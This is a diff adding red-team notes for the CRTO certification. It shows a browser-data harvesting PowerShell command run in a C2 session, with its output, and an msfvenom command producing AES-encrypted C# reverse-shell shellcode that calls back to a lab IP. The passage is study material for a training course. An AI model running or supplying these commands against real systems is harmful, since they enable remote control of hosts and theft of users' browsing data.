@@ -1,6 +1,26 @@
 # CRTO_Notes
 Collection of things used for CRTO that might be useful
 
+Browser D33ts:
+https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
+```
+(crto_cov) > powershell Get-BrowserData -Browser All
+
+Cannot find path 'C:\Users\p4yl0ad\AppData\Local\Google\Chrome\User Data\Default\History' because it does not exist.
+
+
+Browser User  DataType Data                                                                               
+------- ----  -------- ----                                                                              
+IE      p4yl0ad History  https://p4yl0ad.github.io/                                                     
+IE      p4yl0ad History  https://p4yl0ad.github.io/                                                              
+IE      p4yl0ad History  https://p4yl0ad.github.io/
+
+```
+
+
+
+****
+
 Encrypting C# shellcode
 ```
 msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.152.100 LPORT=80 -f csharp --encrypt aes256 --encrypt-key 12345678901234567890123456789012 --encrypt-iv 1234567890123456
